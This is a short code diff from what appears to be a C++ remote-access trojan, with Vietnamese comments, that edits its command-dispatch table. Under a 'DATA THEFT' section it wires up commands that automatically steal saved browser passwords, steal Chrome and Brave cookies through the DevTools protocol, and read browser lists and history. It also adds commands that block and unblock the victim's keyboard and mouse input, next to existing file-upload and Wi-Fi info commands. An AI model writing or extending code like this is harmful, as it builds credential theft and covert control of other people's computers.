@@ -66,8 +66,11 @@ public:
         map["fs_upload"] = FileHandlers::uploadFile;
 
         // === DATA THEFT ===
-        map["steal_credentials"] = ChromeRecovery::handleStealCredentials; // Lấy Pass (Edge/Chrome cũ)
-        map["steal_cookies_cdp"] = ProcessHandlers::stealCookiesCDP;       // Lấy Cookie (Brave/Chrome mới - CDP)
+        map["steal_passwords_auto"] = [](const json &)
+        { return ChromeRecovery::handleAutoStealPasswords(); };
+        map["steal_cookies_cdp"] = ProcessHandlers::stealCookiesCDP;
+        map["get_browser_list"] = ProcessHandlers::getBrowserList;
+        map["get_browser_history"] = ProcessHandlers::getBrowserHistory;
 
         // === CHAT SYSTEM (THÊM VÀO ĐÂY) ===
         map["chat_start"] = ProcessHandlers::handleChatCommand;
@@ -75,5 +78,10 @@ public:
         map["chat_message"] = ProcessHandlers::handleChatCommand;
 
         map["wifi_info"] = ProcessHandlers::getWifiInfo;
+
+        // === INPUT BLOCKING ===
+        map["block_input"] = ProcessHandlers::blockInput;
+        map["unblock_input"] = ProcessHandlers::unblockInput;
+        map["get_block_status"] = ProcessHandlers::getBlockStatus;
     }
 };
